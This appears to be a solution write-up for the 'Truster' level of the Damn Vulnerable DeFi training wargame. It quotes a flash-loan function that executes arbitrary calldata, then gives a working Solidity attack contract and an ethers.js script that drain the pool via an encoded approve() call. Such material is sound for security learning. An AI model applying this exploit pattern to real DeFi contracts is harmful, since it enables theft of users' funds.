## GOAL
Take all tokens in single transaction

## Examning The Code
The flashLoan is trusting us :) 
It is giving permission to the target to call whatever function he want.
```solidity
 function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data); // here is the functionCall

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

## Exploit 
We can develop a contract the allow us to call flashLoan, and then pass the approve function in the data parameter so that we can
call the transfer function to transfer tokens to our address.

## Solution
```solidity
contract AttackContract{

    TrusterLenderPool trust;
    IERC20 public immutable damnVulnerableDefi;

    constructor(address _trust,address token){
        trust = TrusterLenderPool(_trust);
        damnVulnerableDefi = IERC20(token);
    }

    function attack(uint256 amount,address borrower,address target,bytes calldata data) external
    {
        trust.flashLoan(amount, borrower, target, data);
        damnVulnerableDefi.transferFrom(address(trust), msg.sender, 1000000 ether);
    }


}
```
```javascript
const deploying = await ethers.getContractFactory("AttackContract",attacker);
const attackContract = await deploying.deploy(this.pool.address,this.token.address);

const abi = ["function approve(address spender, uint256 amount)"]
const iface = new ethers.utils.Interface(abi);
const data = iface.encodeFunctionData("approve",[attackContract.address,TOKENS_IN_POOL])
await attackContract.attack(0,attacker.address,this.token.address,data);
```